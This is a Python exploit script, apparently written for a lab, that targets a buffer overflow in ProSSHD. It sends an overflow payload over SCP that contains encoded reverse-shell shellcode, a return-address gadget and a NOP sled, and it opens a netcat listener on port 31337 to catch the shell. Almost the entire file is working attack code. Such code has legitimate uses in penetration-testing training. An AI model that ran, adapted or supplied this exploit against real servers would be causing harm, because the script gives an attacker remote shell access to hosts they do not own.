from scp import SCPClient
from paramiko import SSHClient
from struct import pack
from os import system
from threading import Thread

SERV = "10.0.0.38"
USER = "user"
PASS = "password"
C2_PORT = 31337 # Must match RPORT in shellcode if msfvenom was used to generate shellcode.
LISTEN_COUNT = 2

def handle_shell():
    try:
        system(f"nc -nvlp {C2_PORT}")
    except Exception as e:
        print(f"[-] Shell error: {e}")

def main():
    print(f"[+] Constructing payload...")

    reverse_shell_sc =  b""
    reverse_shell_sc += b"\xbe\x03\x9c\xd7\x10\xda\xc0\xd9\x74\x24\xf4\x5a"
    reverse_shell_sc += b"\x2b\xc9\xb1\x52\x31\x72\x12\x83\xea\xfc\x03\x71"
    reverse_shell_sc += b"\x92\x35\xe5\x89\x42\x3b\x06\x71\x93\x5c\x8e\x94"
    reverse_shell_sc += b"\xa2\x5c\xf4\xdd\x95\x6c\x7e\xb3\x19\x06\xd2\x27"
    reverse_shell_sc += b"\xa9\x6a\xfb\x48\x1a\xc0\xdd\x67\x9b\x79\x1d\xe6"
    reverse_shell_sc += b"\x1f\x80\x72\xc8\x1e\x4b\x87\x09\x66\xb6\x6a\x5b"
    reverse_shell_sc += b"\x3f\xbc\xd9\x4b\x34\x88\xe1\xe0\x06\x1c\x62\x15"
    reverse_shell_sc += b"\xde\x1f\x43\x88\x54\x46\x43\x2b\xb8\xf2\xca\x33"
    reverse_shell_sc += b"\xdd\x3f\x84\xc8\x15\xcb\x17\x18\x64\x34\xbb\x65"
    reverse_shell_sc += b"\x48\xc7\xc5\xa2\x6f\x38\xb0\xda\x93\xc5\xc3\x19"
    reverse_shell_sc += b"\xe9\x11\x41\xb9\x49\xd1\xf1\x65\x6b\x36\x67\xee"
    reverse_shell_sc += b"\x67\xf3\xe3\xa8\x6b\x02\x27\xc3\x90\x8f\xc6\x03"
    reverse_shell_sc += b"\x11\xcb\xec\x87\x79\x8f\x8d\x9e\x27\x7e\xb1\xc0"
    reverse_shell_sc += b"\x87\xdf\x17\x8b\x2a\x0b\x2a\xd6\x22\xf8\x07\xe8"
    reverse_shell_sc += b"\xb2\x96\x10\x9b\x80\x39\x8b\x33\xa9\xb2\x15\xc4"
    reverse_shell_sc += b"\xce\xe8\xe2\x5a\x31\x13\x13\x73\xf6\x47\x43\xeb"
    reverse_shell_sc += b"\xdf\xe7\x08\xeb\xe0\x3d\x9e\xbb\x4e\xee\x5f\x6b"
    reverse_shell_sc += b"\x2f\x5e\x08\x61\xa0\x81\x28\x8a\x6a\xaa\xc3\x71"
    reverse_shell_sc += b"\xfd\xdf\x13\x79\xc6\xb7\x11\x79\x42\x21\x9f\x9f"
    reverse_shell_sc += b"\xd8\xa1\xc9\x08\x75\x5b\x50\xc2\xe4\xa4\x4e\xaf"
    reverse_shell_sc += b"\x27\x2e\x7d\x50\xe9\xc7\x08\x42\x9e\x27\x47\x38"
    reverse_shell_sc += b"\x09\x37\x7d\x54\xd5\xaa\x1a\xa4\x90\xd6\xb4\xf3"
    reverse_shell_sc += b"\xf5\x29\xcd\x91\xeb\x10\x67\x87\xf1\xc5\x40\x03"
    reverse_shell_sc += b"\x2e\x36\x4e\x8a\xa3\x02\x74\x9c\x7d\x8a\x30\xc8"
    reverse_shell_sc += b"\xd1\xdd\xee\xa6\x97\xb7\x40\x10\x4e\x6b\x0b\xf4"
    reverse_shell_sc += b"\x17\x47\x8c\x82\x17\x82\x7a\x6a\xa9\x7b\x3b\x95"
    reverse_shell_sc += b"\x06\xec\xcb\xee\x7a\x8c\x34\x25\x3f\xbc\x7e\x67"
    reverse_shell_sc += b"\x16\x55\x27\xf2\x2a\x38\xd8\x29\x68\x45\x5b\xdb"
    reverse_shell_sc += b"\x11\xb2\x43\xae\x14\xfe\xc3\x43\x65\x6f\xa6\x63"
    reverse_shell_sc += b"\xda\x90\xe3"

    return_address = pack("<L", 0x7c345c30) # Push ESP; RET --May need to change this to the address on your system which matches the specified gadget.
    payload = (b"\x41"*492) + return_address 
    payload += (b"\x90"*8) + reverse_shell_sc

    print("[+] Payload ready.\n")

    try:

        # Set up listener.
        listener_thread = Thread(target=handle_shell)
        listener_thread.start()

        # Expoit ProSSH Server.
        print("[i] Connecting to vulnerable ProSSHD server...")
        ssh_client = SSHClient()
        ssh_client.load_system_host_keys()
        ssh_client.connect(hostname=SERV, username=USER, password=PASS,key_filename=None)
        print("[+] Conection established.\n\n[i] Sending the SCP payload.\n")
        
        with SCPClient(ssh_client.get_transport(), sanitize=lambda x:x) as scp:
            scp.put(scp, payload)
        
        listener_thread.join()

    except Exception as e:
        print(f"[-] Error: {e}")    

if __name__ == "__main__":
    main()